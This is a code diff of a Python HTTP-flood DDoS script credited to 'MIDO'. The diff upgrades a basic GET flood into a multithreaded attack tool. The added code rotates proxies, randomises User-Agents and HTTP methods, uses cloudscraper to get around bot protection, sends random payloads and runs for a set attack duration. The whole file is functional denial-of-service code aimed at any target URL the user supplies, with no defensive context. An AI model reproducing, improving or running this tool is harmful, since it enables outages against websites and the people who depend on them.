@@ -1,193 +1,204 @@
 #!/usr/bin/env python3
+
 import requests
 import time
-import sys
 import argparse
 import threading
 import logging
+import random
+import json
 from colorama import init, Fore, Style
-from datetime import datetime
+from dns import resolver
+from base64 import b64encode
+from itertools import cycle
+from cloudscraper import create_scraper
+import os
+import subprocess
 
 # Initialize colorama
 init(autoreset=True)
 
-# Colors for different messages
+# Colors
 RED = Fore.RED
 GREEN = Fore.GREEN
 YELLOW = Fore.YELLOW
 BLUE = Fore.BLUE
 RESET = Style.RESET_ALL
 
-# Global variables to count requests and success/error statistics
+# Global variables
 requests_sent = 0
 successful_requests = 0
 failed_requests = 0
-rps = 0  # Requests per second
 last_time = time.time()
+requests_lock = threading.Lock()
 
-requests_lock = threading.Lock()  # Lock for thread-safe requests counting
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+]
 
-# Function to display the banner with colors
+HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
+
+# Functions
 def display_banner():
-    print(f"""
-    {BLUE}##################################################
-    {BLUE}#                                                #
-    {BLUE}#                DDoS Toolkit                    #
-    {BLUE}#        Simple HTTP Flood DDoS Attack           #
-    {BLUE}#                                                #
-    {YELLOW}#            Created BY MIDO                   #
-    {YELLOW}#                                              #
-    {BLUE}#                                                #
-    {BLUE}##################################################
-    """)
+    print(f"""{BLUE}
+    ##################################################
+    #                                                #
+    #                    DDoS                        #
+    #          Advanced HTTP Flood DDoS              #
+    #                                                #
+    {YELLOW}#        Created by MIDO                 #
+    {BLUE}#                                          #
+    ##################################################
+    {RESET}""")
 
-# Function to send requests to the target URL
-def attack(target_url, stop_event, pause_time):
-    global requests_sent, successful_requests, failed_requests
+def load_proxies(proxy_file):
+    try:
+        with open(proxy_file, "r") as f:
+            proxy_list = f.read().splitlines()
+        return [p for p in proxy_list if p.strip()]
+    except FileNotFoundError:
+        logging.error(f"Proxy file '{proxy_file}' not found.")
+        return []
+
+def resolve_target(target_url):
+    try:
+        domain = target_url.split("//")[-1].split("/")[0]
+        ip = resolver.resolve(domain, "A")[0].to_text()
+        logging.info(f"Resolved {domain} to IP: {ip}")
+        return ip
+    except Exception as e:
+        logging.error(f"Failed to resolve domain: {e}")
+        return None
+
+def check_target_reachable(ip):
+    try:
+        result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
+        if result.returncode == 0:
+            logging.info("Target is reachable (Ping successful).")
+            return True
+        else:
+            logging.error("Target is unreachable (Ping failed).")
+            return False
+    except Exception as e:
+        logging.error(f"Ping check failed: {e}")
+        return False
+
+def generate_payload():
+    return b64encode(os.urandom(64)).decode()
+
+def attack(target_url, stop_event, pause_time, proxies=None):
+    global requests_sent, successful_requests, failed_requests, last_time
+    scraper = create_scraper()
+    proxy_pool = cycle(proxies) if proxies else None
+
     while not stop_event.is_set():
         try:
-            start_time = time.time()
-            response = requests.get(target_url, timeout=3)
+            headers = {"User-Agent": random.choice(USER_AGENTS)}
+            method = random.choice(HTTP_METHODS)
 
-            # Calculate response time
-            response_time = time.time() - start_time
+            if method in ["POST", "PUT", "PATCH"]:
+                data = {"data": generate_payload()}
+            else:
+                data = None
 
-            # Adaptive throttling based on server response time and failure rate
-            if response_time > 1.0:  # Adjust pause time if response time is too high
-                pause_time *= 1.1
-            elif response.status_code == 404 or response.status_code == 403:
-                failed_requests += 1
-                pause_time *= 1.2
+            proxy = {"http": next(proxy_pool)} if proxy_pool else None
 
-            if response.status_code >= 500:
-                failed_requests += 1
-                print(f"{RED}Server error: {response.status_code}. Target may be down or overloaded.")
-                stop_event.set()
-                break
-            elif response.status_code == 404:
-                failed_requests += 1
-                print(f"{RED}404: Not Found. The server may be unreachable.")
-                stop_event.set()
-                break
-            elif response.status_code == 403:
-                failed_requests += 1
-                print(f"{RED}403: Forbidden. The server has blocked the attack.")
-                stop_event.set()
-                break
+            response = scraper.request(
+                method, target_url, headers=headers, proxies=proxy, timeout=5, data=data
+            )
 
             with requests_lock:
                 requests_sent += 1
-                successful_requests += 1
+                last_time = time.time()
+                if response.status_code in [200, 201, 204]:
+                    successful_requests += 1
+                else:
+                    failed_requests += 1
 
         except requests.RequestException as e:
-            failed_requests += 1
-            print(f"{RED}Error: Unable to reach the server. Details: {e}")
-            stop_event.set()
-            print(f"{YELLOW}The server appears to be down or unreachable!")
-            break
+            with requests_lock:
+                failed_requests += 1
+            logging.error(f"Request failed: {e}")
 
-        time.sleep(pause_time)  # Pause to control request rate
+        time.sleep(pause_time)
 
-# Function to display the status of the attack with a color-coded table
-def display_status(stop_event):
-    global requests_sent, successful_requests, failed_requests, rps, last_time
+def display_status(stop_event, duration):
+    start_time = time.time()
     while not stop_event.is_set():
+        elapsed = time.time() - start_time
+        if elapsed >= duration:
+            break
         with requests_lock:
-            elapsed_time = time.time() - last_time
-            if elapsed_time > 1:
-                rps = requests_sent / elapsed_time
-                last_time = time.time()
-            success_rate = (successful_requests / requests_sent * 100) if requests_sent > 0 else 0
-            error_rate = (failed_requests / requests_sent * 100) if requests_sent > 0 else 0
-
-            # Clear the screen and print the table (it will refresh every second)
-            print(f"\033c", end="")  # ANSI escape sequence to clear the screen
-            print(f"{BLUE}Attack Progress:")
-            print(f"{GREEN}-----------------------------------------------")
-            print(f"{YELLOW}| {GREEN}Metric{YELLOW} | {GREEN}Value{RESET}     |")
-            print(f"{YELLOW}|------------------------------------|------------|")
-            print(f"{GREEN}| Requests Sent:             | {requests_sent:<18} |")
-            print(f"{GREEN}| Successful Requests: | {successful_requests:<18} |")
-            print(f"{RED}| Failed Requests:           | {failed_requests:<18} |")
-            print(f"{YELLOW}| RPS:                             | {rps:<18.2f} |")
-            print(f"{YELLOW}| Success Rate:      | {success_rate:.2f}%        |")
-            print(f"{RED}| Error Rate:             | {error_rate:.2f}%        |")
-            print(f"{GREEN}-----------------------------------------------")
-
+            current_time = time.time()
+            rps = requests_sent / max(1, current_time - start_time)
+            print(
+                f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}"
+            )
         time.sleep(1)
 
-# Function to parse command-line arguments
 def parse_args():
-    parser = argparse.ArgumentParser(description="Simple DDoS attack script")
-    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL for the attack (e.g., http://example.com)")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use (default: 10)")
-    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests (in seconds, default: 0.1)")
-    parser.add_argument("-l", "--logfile", type=str, default="attack_log.txt", help="Log file to write logs (default: 'attack_log.txt')")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Enable detailed logging")
-    args = parser.parse_args()
-    return args.url, args.threads, args.pause, args.logfile, args.verbose
+    parser = argparse.ArgumentParser(description="Advanced DDoS Simulation Script")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
+    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration (seconds)")
+    parser.add_argument("--proxies", help="File containing proxy list")
+    parser.add_argument("-l", "--logfile", default="attack.log", help="Log file")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+    return parser.parse_args()
 
-# Function to set up logging configuration
 def setup_logging(logfile, verbose):
-    log_level = logging.DEBUG if verbose else logging.INFO
     logging.basicConfig(
-        level=log_level,
+        filename=logfile,
+        level=logging.DEBUG if verbose else logging.INFO,
         format="%(asctime)s - %(levelname)s - %(message)s",
-        handlers=[
-            logging.FileHandler(logfile),
-            logging.StreamHandler(sys.stdout)  # Print logs to console as well
-        ]
     )
-    logger = logging.getLogger()
-    return logger
 
-# Main function to run the DDoS attack
 def main():
-    global requests_sent, successful_requests, failed_requests, rps
+    args = parse_args()
 
-    # Parse arguments
-    target_url, num_threads, pause_time, logfile, verbose = parse_args()
+    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0:
+        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
+        exit(1)
 
-    if not target_url.startswith(('http://', 'https://')):
-        print(f"{RED}Error: Invalid URL. URL must start with 'http://' or 'https://'.")
-        sys.exit(1)
-
-    # Set up logging
-    logger = setup_logging(logfile, verbose)
-
-    # Display the banner
+    setup_logging(args.logfile, args.verbose)
     display_banner()
 
-    # Create a stop event to stop all threads gracefully
+    proxies = load_proxies(args.proxies) if args.proxies else []
+    target_ip = args.url.split("//")[-1].split("/")[0]  # Extract IP or hostname from URL
+
+    if not check_target_reachable(target_ip):
+        print(f"{RED}Exiting: Target is not reachable.{RESET}")
+        exit(1)
+
     stop_event = threading.Event()
+    threads = []
 
-    # Start the display status thread
-    status_thread = threading.Thread(target=display_status, args=(stop_event,))
-    status_thread.daemon = True
-    status_thread.start()
-
-    # Start attack threads
-    attack_threads = []
-    for _ in range(num_threads):
-        t = threading.Thread(target=attack, args=(target_url, stop_event, pause_time))
+    for _ in range(args.threads):
+        t = threading.Thread(target=attack, args=(args.url, stop_event, args.pause, proxies))
         t.daemon = True
-        attack_threads.append(t)
+        threads.append(t)
         t.start()
 
-    # Wait for the user to stop the attack
+    display_thread = threading.Thread(target=display_status, args=(stop_event, args.duration))
+    display_thread.daemon = True
+    display_thread.start()
+
     try:
-        while True:
-            time.sleep(pause_time)
+        time.sleep(args.duration)
     except KeyboardInterrupt:
-        print(f"\n{RED}Attack interrupted by user.")
+        print(f"{RED}Interrupted by user.")
+    finally:
         stop_event.set()
 
-    # Wait for all attack threads to finish
-    for t in attack_threads:
+    for t in threads:
         t.join()
 
-    # Print final results
-    print(f"{GREEN}Attack finished. Total requests sent: {requests_sent}")
-    
+    with requests_lock:
+        rps = requests_sent / max(1, time.time() - (time.time() - args.duration))
+        print(f"{GREEN}Attack completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps:.2f}{RESET}")
+        logging.info(f"Attack finished. Total Requests Sent: {requests_sent}, Successful: {successful_requests}, Failed: {failed_requests}, Final RPS: {rps:.2f}")
+
 if __name__ == "__main__":
     main()
